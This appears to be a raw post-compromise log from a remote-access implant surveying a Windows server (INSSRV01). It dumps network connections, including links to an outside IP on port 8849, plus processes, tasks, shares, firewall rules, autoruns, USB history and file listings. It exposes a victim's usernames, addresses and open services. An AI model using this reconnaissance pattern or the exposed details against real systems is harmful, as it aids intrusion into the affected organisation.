+  TCP    192.168.5.15:80        192.168.5.1:9101       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:12141      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:16369      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:17085      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:19419      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:21029      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:21061      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:21635      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:22553      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:25229      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:25711      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:27951      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:32221      CLOSE_WAIT      4
+  TCP    192.168.5.15:139       0.0.0.0:0              LISTENING       4
+  TCP    192.168.5.15:2403      107.151.246.11:8849    LAST_ACK        148
+  TCP    192.168.5.15:2451      107.151.246.11:8849    LAST_ACK        148
+  TCP    192.168.5.15:2457      107.151.246.11:8849    LAST_ACK        148
+  TCP    192.168.5.15:2466      107.151.246.11:8849    LAST_ACK        148
+  TCP    192.168.5.15:2485      107.151.246.11:8849    TIME_WAIT       0
+  TCP    192.168.5.15:3268      192.168.1.9:445        SYN_SENT        148
+  TCP    192.168.5.15:3270      132.226.247.73:80      ESTABLISHED     3388
+  TCP    192.168.5.15:3279      104.22.30.153:80       ESTABLISHED     3388
+  TCP    192.168.5.15:3377      192.168.1.10:445       SYN_SENT        148
+  TCP    192.168.5.15:3389      192.168.5.138:61056    ESTABLISHED     2632
+  TCP    192.168.5.15:3391      192.168.5.227:139      TIME_WAIT       0
+  TCP    192.168.5.15:3395      107.151.246.11:8849    ESTABLISHED     148
+  TCP    192.168.5.15:4022      192.168.5.107:445      ESTABLISHED     4
+  UDP    0.0.0.0:445            *:*                                    4
+  UDP    0.0.0.0:500            *:*                                    508
+  UDP    0.0.0.0:1434           *:*                                    1856
+  UDP    0.0.0.0:1701           *:*                                    4
+  UDP    0.0.0.0:3456           *:*                                    1392
+  UDP    0.0.0.0:4500           *:*                                    508
+  UDP    127.0.0.1:123          *:*                                    868
+  UDP    127.0.0.1:1057         *:*                                    884
+  UDP    127.0.0.1:1058         *:*                                    884
+  UDP    127.0.0.1:1114         *:*                                    868
+  UDP    127.0.0.1:3456         *:*                                    1392
+  UDP    192.168.5.15:123       *:*                                    868
+  UDP    192.168.5.15:137       *:*                                    4
+  UDP    192.168.5.15:138       *:*                                    4
+
+
+02/04 10:29:30 UTC [output]
+received output:
+tasklist:
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Console                    0         28 K
+System                           4 Console                    0        272 K
+smss.exe                       376 Console                    0        520 K
+csrss.exe                      424 Console                    0      5,820 K
+winlogon.exe                   448 Console                    0     10,972 K
+services.exe                   496 Console                    0     53,500 K
+lsass.exe                      508 Console                    0     14,232 K
+svchost.exe                    668 Console                    0      3,348 K
+svchost.exe                    760 Console                    0      4,776 K
+svchost.exe                    832 Console                    0      5,956 K
+svchost.exe                    868 Console                    0      7,068 K
+svchost.exe                    884 Console                    0     28,616 K
+msdtc.exe                     1056 Console                    0      5,100 K
+cisvc.exe                     1168 Console                    0      2,004 K
+svchost.exe                   1248 Console                    0      2,564 K
+hMailServer.exe               1280 Console                    0      8,004 K
+inetinfo.exe                  1392 Console                    0     12,604 K
+jqs.exe                       1416 Console                    0      1,772 K
+LMS.exe                       1464 Console                    0      2,808 K
+MsDtsSrvr.exe                 1484 Console                    0     19,888 K
+sqlservr.exe                  1580 Console                    0  1,086,832 K
+msmdsrv.exe                   1636 Console                    0     23,476 K
+svchost.exe                   1740 Console                    0      2,016 K
+ReportingServicesService.     1760 Console                    0     89,564 K
+sqlbrowser.exe                1856 Console                    0      7,824 K
+sqlwriter.exe                 1920 Console                    0      4,144 K
+UNS.exe                       1964 Console                    0     64,624 K
+winvnc4.exe                   2140 Console                    0      4,756 K
+msftesql.exe                  2196 Console                    0      4,612 K
+svchost.exe                   2252 Console                    0      7,520 K
+SQLAGENT90.EXE                2496 Console                    0      7,264 K
+svchost.exe                   2632 Console                    0      5,492 K
+svchost.exe                   2656 Console                    0      4,404 K
+wmiprvse.exe                  2820 Console                    0      5,804 K
+alg.exe                       3052 Console                    0      3,308 K
+cidaemon.exe                  3636 Console                    0      1,444 K
+cidaemon.exe                  3676 Console                    0      1,544 K
+cidaemon.exe                  3844 Console                    0      1,592 K
+logon.scr                     3788 Console                    0      1,984 K
+csrss.exe                     3668 RDP-Tcp#34                 1      1,956 K
+winlogon.exe                   200 RDP-Tcp#34                 1      3,708 K
+rdpclip.exe                   3472 RDP-Tcp#34                 1      1,628 K
+explorer.exe                  3140 RDP-Tcp#34                 1     13,528 K
+jusched.exe                   1192 RDP-Tcp#34                 1      4,608 K
+RTHDCPL.EXE                   4072 RDP-Tcp#34                 1      2,328 K
+ctfmon.exe                    2364 RDP-Tcp#34                 1        604 K
+Tomcat7w.exe                   684 RDP-Tcp#34                 1        308 K
+SqlWb.exe                     1812 RDP-Tcp#34                 1     18,412 K
+wmiprvse.exe                  1228 Console                    0     10,752 K
+wuauclt.exe                   5544 RDP-Tcp#34                 1      4,004 K
+scrnsave.scr                  3920 RDP-Tcp#34                 1      1,588 K
+cmd1.exe                      4540 Console                    0      4,136 K
+w3wp.exe                       636 Console                    0     17,984 K
+cmd1.exe                      3892 Console                    0      1,840 K
+system.exe                    6080 Console                    0      7,280 K
+cmd.exe                        148 Console                    0      7,628 K
+cmd.exe                       4108 Console                    0      4,596 K
+cmd.exe                       5820 Console                    0      4,568 K
+cmd1.exe                       896 Console                    0      4,100 K
+rundll32.exe                  3388 Console                    0     23,840 K
+wmiprvse.exe                  5696 Console                    0      4,952 K
+cmd.exe                       5480 Console                    0      1,820 K
+tasklist.exe                  6096 Console                    0      4,224 K
+
+
+02/04 10:29:31 UTC [output]
+received output:
+schtasks:
+HostName:                             INSSRV01
+TaskName:                             User_Feed_Synchronization-{3D8B23CA-6706-486F-A9AC-659E5C14F707}
+Next Run Time:                        6:31:00 PM, 2/4/2024
+Status:                               Could not start
+Logon Mode:                           Interactive only
+Last Run Time:                        3:52:00 PM, 4/21/2014
+Last Result:                          0
+Creator:                              ramel
+Schedule:                             Every 5 minute(s) from 4:07 PM for 473 minutes on 4/21/2014
+Task To Run:                          C:\WINDOWS\system32\msfeedssync.exe sync
+Start In:                             C:\Program Files\Internet Explorer
+Comment:                              Updates out-of-date system feeds.
+Scheduled Task State:                 Enabled
+Scheduled Type:                       One Time Only
+Start Time:                           4:07:00 PM
+Start Date:                           4/21/2014
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Run As User:                          INSSRV01\ramel
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:0
+Repeat: Every:                        5 Minute(s)
+Repeat: Until: Time:                  None
+Repeat: Until: Duration:              7 Hour(s): 53 Minute(s)
+Repeat: Stop If Still Running:        Disabled
+Idle Time:                            Disabled
+Power Management:                     Disabled
+
+HostName:                             INSSRV01
+TaskName:                             User_Feed_Synchronization-{3D8B23CA-6706-486F-A9AC-659E5C14F707}
+Next Run Time:                        6:31:00 PM, 2/4/2024
+Status:                               Could not start
+Logon Mode:                           Interactive only
+Last Run Time:                        3:52:00 PM, 4/21/2014
+Last Result:                          0
+Creator:                              ramel
+Schedule:                             Every 5 minute(s) from 12:01 AM for 24 hour(s) every day, starting 4/22/2014
+Task To Run:                          C:\WINDOWS\system32\msfeedssync.exe sync
+Start In:                             C:\Program Files\Internet Explorer
+Comment:                              Updates out-of-date system feeds.
+Scheduled Task State:                 Enabled
+Scheduled Type:                       Minute 
+Start Time:                           12:01:00 AM
+Start Date:                           4/22/2014
+End Date:                             N/A
+Days:                                 Everyday
+Months:                               N/A
+Run As User:                          INSSRV01\ramel
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:0
+Repeat: Every:                        5 Minute(s)
+Repeat: Until: Time:                  None
+Repeat: Until: Duration:              24 Hour(s): 0 Minute(s)
+Repeat: Stop If Still Running:        Disabled
+Idle Time:                            Disabled
+Power Management:                     Disabled
+
+HostName:                             INSSRV01
+TaskName:                             User_Feed_Synchronization-{49C58BA9-6036-444E-9C04-33A78A8BC52E}
+Next Run Time:                        6:31:00 PM, 2/4/2024
+Status:                               Could not start
+Logon Mode:                           Interactive only
+Last Run Time:                        9:37:00 AM, 7/9/2014
+Last Result:                          0
+Creator:                              jong
+Schedule:                             Every 5 minute(s) from 9:52 AM for 848 minutes on 7/9/2014
+Task To Run:                          C:\WINDOWS\system32\msfeedssync.exe sync
+Start In:                             C:\Program Files\Internet Explorer
+Comment:                              Updates out-of-date system feeds.
+Scheduled Task State:                 Enabled
+Scheduled Type:                       One Time Only
+Start Time:                           9:52:00 AM
+Start Date:                           7/9/2014
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Run As User:                          INSSRV01\jong
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:0
+Repeat: Every:                        5 Minute(s)
+Repeat: Until: Time:                  None
+Repeat: Until: Duration:              14 Hour(s): 8 Minute(s)
+Repeat: Stop If Still Running:        Disabled
+Idle Time:                            Disabled
+Power Management:                     Disabled
+
+HostName:                             INSSRV01
+TaskName:                             User_Feed_Synchronization-{49C58BA9-6036-444E-9C04-33A78A8BC52E}
+Next Run Time:                        6:31:00 PM, 2/4/2024
+Status:                               Could not start
+Logon Mode:                           Interactive only
+Last Run Time:                        9:37:00 AM, 7/9/2014
+Last Result:                          0
+Creator:                              jong
+Schedule:                             Every 5 minute(s) from 12:01 AM for 24 hour(s) every day, starting 7/10/2014
+Task To Run:                          C:\WINDOWS\system32\msfeedssync.exe sync
+Start In:                             C:\Program Files\Internet Explorer
+Comment:                              Updates out-of-date system feeds.
+Scheduled Task State:                 Enabled
+Scheduled Type:                       Minute 
+Start Time:                           12:01:00 AM
+Start Date:                           7/10/2014
+End Date:                             N/A
+Days:                                 Everyday
+Months:                               N/A
+Run As User:                          INSSRV01\jong
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:0
+Repeat: Every:                        5 Minute(s)
+Repeat: Until: Time:                  None
+Repeat: Until: Duration:              24 Hour(s): 0 Minute(s)
+Repeat: Stop If Still Running:        Disabled
+Idle Time:                            Disabled
+Power Management:                     Disabled
+Get share Info
+
+
+02/04 10:29:32 UTC [output]
+received output:
+These Windows services are started:
+
+   Application Experience Lookup Service
+   Application Layer Gateway Service
+   Automatic Updates
+   Background Intelligent Transfer Service
+   COM+ Event System
+   Computer Browser
+   Cryptographic Services
+   DCOM Server Process Launcher
+   DHCP Client
+   Distributed Link Tracking Client
+   Distributed Transaction Coordinator
+   DNS Client
+   Error Reporting Service
+   Event Log
+   FTP Publishing Service
+   Help and Support
+   HID Input Service
+   hMailServer
+   HTTP SSL
+   IIS Admin Service
+   Indexing Service
+   Intel(R) Active Management Technology User Notification Service
+   Intel(R) Management and Security Application Local Management Service
+   IPSEC Services
+   Java Quick Starter
+   Logical Disk Manager
+   Network Connections
+   Network Location Awareness (NLA)
+   NT LM Security Support Provider
+   Plug and Play
+   Protected Storage
+   Remote Access Connection Manager
+   Remote Procedure Call (RPC)
+   Remote Registry
+   Routing and Remote Access
+   Secondary Logon
+   Security Accounts Manager
+   Server
+   Shell Hardware Detection
+   SQL Server (MSSQLSERVER)
+   SQL Server Agent (MSSQLSERVER)
+   SQL Server Analysis Services (MSSQLSERVER)
+   SQL Server Browser
+   SQL Server FullText Search (MSSQLSERVER)
+   SQL Server Integration Services
+   SQL Server Reporting Services (MSSQLSERVER)
+   SQL Server VSS Writer
+   System Event Notification
+   Task Scheduler
+   TCP/IP NetBIOS Helper
+   Telephony
+   Terminal Services
+   VNC Server Version 4
+   Windows Audio
+   Windows Firewall/Internet Connection Sharing (ICS)
+   Windows Management Instrumentation
+   Windows Time
+   Wireless Configuration
+   Workstation
+   World Wide Web Publishing Service
+
+The command completed successfully.
+
+
+02/04 10:29:32 UTC [output]
+received output:
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+ADMIN$       C:\WINDOWS                      Remote Admin                      
+IPC$                                         Remote IPC                        
+D$           D:\                             Default share                     
+F$           F:\                             Default share                     
+adapters     C:\GMateIE\adapters             
+INSbackup    D:\TestWeb\INSbackup            
+INSDEV       D:\TestWeb\INSDEV               
+Messages     D:\Messages                     
+SSDSQLData   F:\SSDSQLData                   
+TestSQL      D:\TestSQL                      
+TESTweb      D:\TestWeb\TESTweb              
+TXTCONNECT   C:\TXTCONNECT                   
+WebSites     D:\WebSites                     
+The command completed successfully.
+New connections will be remembered.
+
+There are no entries in the list.
+
+
+02/04 10:29:32 UTC [output]
+received output:
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Disable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          File and Printer Sharing
+Enable   No          Remote Desktop
+
+Allowed programs configuration for Standard profile:
+Mode     Name / Program
+-------------------------------------------------------------------
+Enable   VNC Server / C:\Program Files\RealVNC\VNC4\winvnc4.exe
+Enable   VNC Viewer Enterprise Edition for Win32 / C:\Program Files\RealVNC\VNC4\vncviewer.exe
+Enable   Firefox (C:\Program Files\Mozilla Firefox) / C:\Program Files\Mozilla Firefox\firefox.exe
+
+Port configuration for Standard profile:
+Port   Protocol  Mode     Name
+-------------------------------------------------------------------
+1433   TCP       Enable   SQL1433
+80     TCP       Enable   HTTP
+82     TCP       Enable   Port82
+443    TCP       Enable   HTTPS
+110    TCP       Enable   POP3
+8001   TCP       Enable   8001
+90     TCP       Enable   Port90
+139    TCP       Enable   NetBIOS Session Service
+445    TCP       Enable   SMB over TCP
+137    UDP       Enable   NetBIOS Name Service
+138    UDP       Enable   NetBIOS Datagram Service
+3389   TCP       Enable   Remote Desktop
+
+ICMP configuration for Standard profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   8     Allow inbound echo request
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\WINDOWS\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Enable
+Connections     = Disable
+
+Local Area Connection firewall configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+
+
+02/04 10:29:33 UTC [output]
+received output:
+Firewall status:
+-------------------------------------------------------------------
+Profile                           = Standard
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+Group policy version              = None
+Remote admin mode                 = Disable
+
+Ports currently open on all network interfaces:
+Port   Protocol  Version  Program
+-------------------------------------------------------------------
+80     TCP       IPv4     (null)
+82     TCP       IPv4     (null)
+90     TCP       IPv4     (null)
+110    TCP       IPv4     (null)
+137    UDP       IPv4     (null)
+139    TCP       IPv4     (null)
+138    UDP       IPv4     (null)
+3389   TCP       IPv4     (null)
+1433   TCP       IPv4     C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Binn\sqlservr.exe
+443    TCP       IPv4     (null)
+445    TCP       IPv4     (null)
+5800   TCP       IPv4     C:\Program Files\RealVNC\VNC4\winvnc4.exe
+5900   TCP       IPv4     C:\Program Files\RealVNC\VNC4\winvnc4.exe
+8001   TCP       IPv4     (null)
+Get Domain Info
+Domain
+
+-------------------------------------------------------------------------------
+INSDOMAINTEST        
+INTERCOMMERCE        
+WORKGROUP            
+The command completed successfully.
+
+The request will be processed at a domain controller for domain WORKGROUP.
+The request will be processed at a domain controller for domain WORKGROUP.
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+02/04 10:29:33 UTC [output]
+received output:
+The request will be processed at a domain controller for domain WORKGROUP.
+
+Get AutoRun Info
+Load CheckDoor
+
+DllHijack:
+
+Registry Run:
+
+
+02/04 10:29:33 UTC [output]
+received output:
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    NvCplDaemon    REG_SZ    RUNDLL32.EXE C:\WINDOWS\system32\NvCpl.dll,NvStartup
+    nwiz    REG_SZ    nwiz.exe /install
+    NvMediaCenter    REG_SZ    RUNDLL32.EXE C:\WINDOWS\system32\NvMcTray.dll,NvTaskbarInit
+    SunJavaUpdateSched    REG_SZ    "C:\Program Files\Common Files\Java\Java Update\jusched.exe"
+    Adobe ARM    REG_SZ    "C:\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe"
+    RTHDCPL    REG_SZ    RTHDCPL.EXE
+    IgfxTray    REG_SZ    C:\WINDOWS\system32\igfxtray.exe
+    HotKeysCmds    REG_SZ    C:\WINDOWS\system32\hkcmd.exe
+    Persistence    REG_SZ    C:\WINDOWS\system32\igfxpers.exe
+    picon    REG_SZ    "C:\Program Files\Common Files\Intel\Privacy Icon\PrivacyIconClient.exe" -startup
+
+
+
+
+Get USB Info
+
+USB Log:
+
+
+02/04 10:29:33 UTC [output]
+received output:
+USB_Name: Generic Flash Disk USB Device
+UID_Tag: 53B77B8A&0
+Path: USBSTOR\Disk&Ven_Generic&Prod_Flash_Disk&Rev_8.07\53B77B8A&0
+
+USB_Name: HUAWEI SD Storage USB Device
+UID_Tag: 7&144850da&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&144850da&0
+
+USB_Name: 
+UID_Tag: 7&1510a485&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&1510a485&0
+
+USB_Name: HUAWEI SD Storage USB Device
+UID_Tag: 7&191b83a0&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&191b83a0&0
+
+USB_Name: 
+UID_Tag: 7&1ac86570&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&1ac86570&0
+
+USB_Name: 
+UID_Tag: 7&21afbd92&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&21afbd92&0
+
+USB_Name: 
+UID_Tag: 7&2342e4a&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&2342e4a&0
+
+USB_Name: 
+UID_Tag: 7&23f78bd2&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&23f78bd2&0
+
+USB_Name: 
+UID_Tag: 7&2bc899f1&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&2bc899f1&0
+
+USB_Name: 
+UID_Tag: 7&2f421540&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&2f421540&0
+
+USB_Name: 
+UID_Tag: 7&35c229d6&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&35c229d6&0
+
+USB_Name: HUAWEI SD Storage USB Device
+UID_Tag: 7&35c229d6&1
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&35c229d6&1
+
+USB_Name: HUAWEI SD Storage USB Device
+UID_Tag: 7&3b8af95b&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&3b8af95b&0
+
+USB_Name: 
+UID_Tag: 7&6b5301a&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&6b5301a&0
+
+USB_Name: HUAWEI SD Storage USB Device
+UID_Tag: 7&b7911e9&0
+Path: USBSTOR\Disk&Ven_HUAWEI&Prod_SD_Storage&Rev_2.31\7&b7911e9&0
+
+USB_Name: Memorex TRAVELDRIVE 005B USB Device
+UID_Tag: 078618110E7B&0
+Path: USBSTOR\Disk&Ven_Memorex&Prod_TRAVELDRIVE_005B&Rev_PMAP\078618110E7B&0
+
+USB_Name: Seagate BUP Slim BK USB Device
+UID_Tag: NA7YZ8AV&0
+Path: USBSTOR\Disk&Ven_Seagate&Prod_BUP_Slim_BK&Rev_0304\NA7YZ8AV&0
+
+USB_Name: silicon -power USB Device
+UID_Tag: E68B150058D8&0
+Path: USBSTOR\Disk&Ven_silicon&Prod_-power&Rev_0.00\E68B150058D8&0
+
+USB_Name: SMI USB DISK USB Device
+UID_Tag: 3ZRAJBDL81XWROHK&0
+Path: USBSTOR\Disk&Ven_SMI&Prod_USB_DISK&Rev_1100\3ZRAJBDL81XWROHK&0
+
+USB_Name: WD Elements 1023 USB Device
+UID_Tag: 575841314135305839343738&0
+Path: USBSTOR\Disk&Ven_WD&Prod_Elements_1023&Rev_2005\575841314135305839343738&0
+
+Mini Dir Info
+Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\
+
+02/17/2007  11:33 PM            47,772 NTDETECT.COM
+02/17/2007  11:33 PM           297,072 ntldr
+11/07/2007  08:00 AM            17,734 eula.2052.txt
+11/07/2007  08:00 AM             5,686 vcredist.bmp
+11/07/2007  08:00 AM            17,734 eula.3082.txt
+11/07/2007  08:00 AM             1,110 globdata.ini
+11/07/2007  08:00 AM            17,734 eula.1040.txt
+11/07/2007  08:00 AM            17,734 eula.1042.txt
+11/07/2007  08:00 AM               118 eula.1041.txt
+11/07/2007  08:00 AM               843 install.ini
+11/07/2007  08:00 AM            17,734 eula.1036.txt
+11/07/2007  08:00 AM            17,734 eula.1028.txt
+11/07/2007  08:00 AM            17,734 eula.1031.txt
+11/07/2007  08:00 AM            10,134 eula.1033.txt
+11/07/2007  08:03 AM            96,272 install.res.3082.dll
+11/07/2007  08:03 AM           562,688 install.exe
+11/07/2007  08:03 AM            76,304 install.res.1028.dll
+11/07/2007  08:03 AM            96,272 install.res.1031.dll
+11/07/2007  08:03 AM            97,296 install.res.1036.dll
+11/07/2007  08:03 AM            95,248 install.res.1040.dll
+11/07/2007  08:03 AM            75,792 install.res.2052.dll
+11/07/2007  08:03 AM            79,888 install.res.1042.dll
+11/07/2007  08:03 AM            81,424 install.res.1041.dll
+11/07/2007  08:03 AM            91,152 install.res.1033.dll
+11/07/2007  08:09 AM         1,442,522 VC_RED.cab
+11/07/2007  08:12 AM           232,960 VC_RED.MSI
+07/08/2008  02:48 PM                 0 MSDOS.SYS
+07/08/2008  02:48 PM                 0 CONFIG.SYS
+07/08/2008  02:48 PM                 0 IO.SYS
+07/08/2008  02:48 PM                 0 AUTOEXEC.BAT
+07/08/2008  02:49 PM    <DIR>          wmpub
+07/08/2008  10:30 PM     2,094,067,712 pagefile.sys
+07/08/2008  10:30 PM    <DIR>          WINDOWS
+07/08/2008  10:35 PM               210 boot.ini
+07/08/2008  10:36 PM    <DIR>          System Volume Information
+07/08/2008  10:36 PM    <DIR>          Documents and Settings
+07/08/2008  10:37 PM    <DIR>          Program Files
+01/06/2009  12:57 PM    <DIR>          RECYCLER
+01/06/2009  01:12 PM    <DIR>          Inetpub
+01/06/2009  01:13 PM    <DIR>          FPSE_search
+02/16/2009  06:38 PM    <DIR>          ASPTurbine
+02/25/2009  01:03 PM    <DIR>          GMateIE
+05/11/2009  10:58 AM    <DIR>          OpenSSL
+09/22/2009  10:13 AM    <DIR>          TXTCONNECT
+02/05/2010  04:23 PM               502 Sys_LogWin.log
+04/16/2010  12:16 PM       381,582,723 GMateIE.zip
+05/19/2010  10:22 AM    <DIR>          scc_40
+06/14/2010  08:32 AM    <DIR>          Config.Msi
+07/26/2011  11:52 AM    <DIR>          temp
+03/21/2012  11:36 AM           961,536 fru-2.1.36867.1-setup.msi
+03/21/2012  11:48 AM    <DIR>          New Folder
+03/21/2012  11:51 AM    <DIR>          New Folder (2)
+03/21/2012  12:39 PM    <DIR>          New Folder (3)
+04/13/2012  10:45 AM    <DIR>          Sun
+04/27/2012  05:27 PM    <DIR>          jitufl
+04/27/2012  05:29 PM    <DIR>          jit
+06/01/2012  04:18 PM             1,024 .rnd
+07/27/2015  09:27 AM    <DIR>          found.000
+03/12/2018  11:25 AM        15,340,804 jan2017.csv
+04/25/2018  08:45 PM    <DIR>          BOOT
+04/25/2018  09:07 PM    <DIR>          easeus_tb_cloud
+04/25/2018  09:07 PM           321,024 EUMONBMP.SYS
+04/27/2018  08:23 AM    <DIR>          found.001
+04/27/2018  10:11 AM    <DIR>          Intel
+11/12/2018  03:29 PM       755,499,008 BOI.MDF
+11/12/2018  03:30 PM        78,577,664 BOI_1.LDF
+06/02/2023  09:38 AM           262,144 WebCWS - Original Template.mdb
+              41 File(s)  3,330,129,042 bytes
+              26 Dir(s)  24,287,653,888 bytes free
+Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Program Files
+
+07/08/2008  02:44 PM    <DIR>          Windows NT
+07/08/2008  02:44 PM    <DIR>          Internet Explorer
+07/08/2008  02:45 PM    <DIR>          ComPlus Applications
+07/08/2008  02:46 PM    <DIR>          Outlook Express
+07/08/2008  02:46 PM    <DIR>          NetMeeting
+07/08/2008  02:47 PM    <DIR>          Windows Media Player
+07/08/2008  10:37 PM    <DIR>          .
+07/08/2008  10:37 PM    <DIR>          ..
+07/08/2008  10:37 PM    <DIR>          Common Files
+01/06/2009  11:04 AM    <DIR>          OnlineHelpConsole
+01/06/2009  11:16 AM    <DIR>          VIA
+01/06/2009  11:18 AM    <DIR>          Microsoft SQL Server
+01/06/2009  11:33 AM    <DIR>          Microsoft.NET
+01/06/2009  11:33 AM    <DIR>          Microsoft Office
+01/06/2009  11:33 AM    <DIR>          Microsoft Analysis Services
+01/06/2009  11:38 AM    <DIR>          SQLXML 4.0
+01/06/2009  11:38 AM    <DIR>          Microsoft Visual Studio 8
+01/07/2009  07:19 PM    <DIR>          MSXML 6.0
+01/08/2009  07:35 AM    <DIR>          Java
+01/08/2009  07:36 AM    <DIR>          Sun
+09/22/2009  10:13 AM    <DIR>          GlobeSolutions
+11/11/2009  03:45 PM    <DIR>          Reference Assemblies
+11/11/2009  03:45 PM    <DIR>          MSBuild
+05/19/2010  10:31 AM    <DIR>          Sophos
+09/27/2010  03:55 PM    <DIR>          hMailServer
+01/06/2011  11:43 AM    <DIR>          WebSupergoo
+02/10/2011  01:52 PM    <DIR>          Microsoft
+04/07/2011  04:59 PM    <DIR>          SAP BusinessObjects
+10/26/2011  10:18 AM    <DIR>          Your Company Name
+10/26/2011  10:19 AM    <DIR>          CBPro
+04/30/2012  10:51 AM    <DIR>          IDAutomation.com Code 39 Font Advantage Package DEMO
+04/30/2012  10:52 AM    <DIR>          IDAutomation.com Crystal Reports UFL
+05/09/2012  10:39 AM    <DIR>          ASP to ASP.NET Migration Assistant
+05/16/2012  09:56 AM    <DIR>          Intercommerce
+07/06/2012  09:59 AM    <DIR>          NetBeans 6.0
+07/06/2012  10:03 AM    <DIR>          Mozilla Maintenance Service
+07/06/2012  11:27 AM    <DIR>          Apache Software Foundation
+07/11/2012  07:15 PM    <DIR>          Default Company Name
+10/24/2012  12:22 PM    <DIR>          Notepad++
+11/25/2012  11:36 PM    <DIR>          WinRAR
+12/14/2012  07:09 AM    <DIR>          RealVNC
+03/07/2013  06:21 PM    <DIR>          Adobe
+03/20/2013  12:38 PM    <DIR>          IE
+04/02/2013  03:11 AM    <DIR>          bd
+04/25/2018  08:36 PM    <DIR>          EaseUS
+04/27/2018  10:11 AM    <DIR>          Intel
+04/27/2018  10:24 AM    <DIR>          Realtek
+03/26/2019  08:14 PM    <DIR>          Mozilla Firefox
+04/24/2019  02:22 PM    <DIR>          Globe Tattoo Broadband
+08/16/2019  02:23 PM    <DIR>          Belarc
+               0 File(s)              0 bytes
+              50 Dir(s)  24,287,653,888 bytes free
+Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\
+
+
+02/04 10:29:38 UTC [output]
+received output:
+Module Name  Display Name           Driver Type   Link Date             
+============ ====================== ============= ======================
+ACPI         Microsoft ACPI Driver  Kernel        2/17/2007 1:58:47 PM  
+ACPIEC       ACPIEC                 Kernel        3/25/2003 3:16:26 PM  
+aec          Microsoft Kernel Acous Kernel        9/30/2004 1:24:23 AM  
+AFD          AFD                    Kernel        12/27/2011 10:11:19 PM
+Ambfilt      Ambfilt                Kernel        8/5/2008 8:10:11 PM   
+AsyncMac     RAS Asynchronous Media Kernel        3/25/2003 3:11:27 PM  
+atapi        Standard IDE/ESDI Hard Kernel        2/17/2007 2:07:34 PM  
+Atmarpc      ATM ARP Client Protoco Kernel        2/17/2007 1:54:34 PM  
+audstub      Audio Stub Driver      Kernel        3/25/2003 3:09:12 PM  
+Beep         Beep                   Kernel        3/25/2003 3:03:04 PM  
+cbidf2k      cbidf2k                Kernel        3/25/2003 3:05:00 PM  
+Cdfs         Cdfs                   File System   2/17/2007 2:27:08 PM  
+Cdrom        CD-ROM Driver          Kernel        2/17/2007 2:07:48 PM  
+ClusDisk     Cluster Disk Driver    Kernel        2/17/2007 2:02:55 PM  
+crcdisk      CRC Disk Filter Driver Kernel        2/17/2007 2:09:50 PM  
+DfsDriver    DfsDriver              File System   2/17/2007 1:51:17 PM  
+Disk         Disk Driver            Kernel        2/17/2007 2:07:51 PM  
+dmboot       dmboot                 Kernel        2/17/2007 2:10:48 PM  
